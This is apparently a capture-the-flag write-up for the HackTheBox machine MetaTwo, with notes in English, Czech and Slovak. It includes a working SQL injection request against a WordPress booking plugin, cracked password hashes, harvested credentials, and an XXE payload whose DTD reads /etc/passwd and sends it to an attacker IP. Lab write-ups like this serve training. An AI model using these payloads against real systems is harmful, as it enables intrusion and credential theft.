---
authors:
    - Lukas Daubner
date: 16-01-2024
---

# MetaTwo

## Nmap

```
└─$ sudo nmap -sV 10.10.11.186                               
Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-04 08:02 EDT
Stats: 0:02:16 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 66.67% done; ETC: 08:05 (0:01:02 remaining)
Nmap scan report for 10.10.11.186
Host is up (0.10s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp?
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
80/tcp open  http    nginx 1.18.0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port21-TCP:V=7.92%I=7%D=11/4%Time=6364FF6A%P=x86_64-pc-linux-gnu%r(Gene
SF:ricLines,8F,"220\x20ProFTPD\x20Server\x20\(Debian\)\x20\[::ffff:10\.10\
SF:.11\.186\]\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x20cre
SF:ative\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x20creative
SF:\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 173.46 seconds
```

## METAPRESS (web)

Interesting stuff:

* http://metapress.htb/wp-json/wp/v2/users
* maybe bruteforce via http://metapress.htb/xmlrpc.php
* Found booking plugin

## SQLi na booking plugin ([popis](https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357)

```
curl -i 'http://metapress.htb/wp-admin/admin-ajax.php' --data 'action=bookingpress_front_get_category_services&_wpnonce=4b2f606bc9&category_id=33&total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -'
```

### Response

HTTP/1.1 200 OK Server: nginx/1.18.0 Date: Fri, 04 Nov 2022 12:28:23 GMT Content-Type: text/html; charset=UTF-8 Transfer-Encoding: chunked Connection: keep-alive X-Powered-By: PHP/8.0.24 X-Robots-Tag: noindex X-Content-Type-Options: nosniff Expires: Wed, 11 Jan 1984 05:00:00 GMT Cache-Control: no-cache, must-revalidate, max-age=0 X-Frame-Options: SAMEORIGIN Referrer-Policy: strict-origin-when-cross-origin

\[{"bookingpress_service_id":"10.5.15-MariaDB-0+deb11u1","bookingpress_category_id":"Debian 11","bookingpress_service_name":"debian-linux-gnu","bookingpress_service_price":"$1.00","bookingpress_service_duration_val":"2","bookingpress_service_duration_unit":"3","bookingpress_service_description":"4","bookingpress_service_position":"5","bookingpress_servicedate_created":"6","service_price_without_currency":1,"img_url":"http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/images/placeholder-img.jpg"}\]

## Wordpress hashe

```
admin:$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.
manager:$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70
```

### Cracked

```
manager:partylikearockstar
```

## XXE

https://blog.wpsec.com/wordpress-xxe-in-media-library-cve-2021-29447/

### payload.wav

```
RIFF�WAVEiXML{<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM 'http://10.10.14.50:9123/evil.dtd'>%remote;%init;%trick;]>
```

### evil.dtd

Funguje

```
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">

<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://10.10.14.59:9123/?p=%file;'>" >
```

### wp-config.php

```
...
define( 'FS_METHOD', 'ftpext' );
define( 'FTP_USER', 'metapress.htb' );
define( 'FTP_PASS', '9NYS_ii@FyL_p5M2NvJ' );
define( 'FTP_HOST', 'ftp.metapress.htb' );
define( 'FTP_BASE', 'blog/' );
define( 'FTP_SSL', false );
...
```

# FTP (port 21)

* anonymous login nefunguje
* `manager:partylikearockstar` nefunguje
* mame heslo z wp-config.php vyssie
* po prihlaseni vidno v zlozke `mailer` subor `sendmail.php`, v nom:

```
$mail->Host = "mail.metapress.htb";
$mail->SMTPAuth = true;                          
$mail->Username = "jnelson@metapress.htb";                 
$mail->Password = "Cb4_JmWM8zUZWMu@Ys";                           
$mail->SMTPSecure = "tls";                           
$mail->Port = 587;
```

# SSH

manager mi taky nejde

`ssh jnelson@10.10.11.186` `Cb4_JmWM8zUZWMu@Ys`

## Root

v `~/.passpie/.keys` je pgp kluc, cez johntheripper ide craknut, najprv potreba zavolat `gpg2john` utilitku.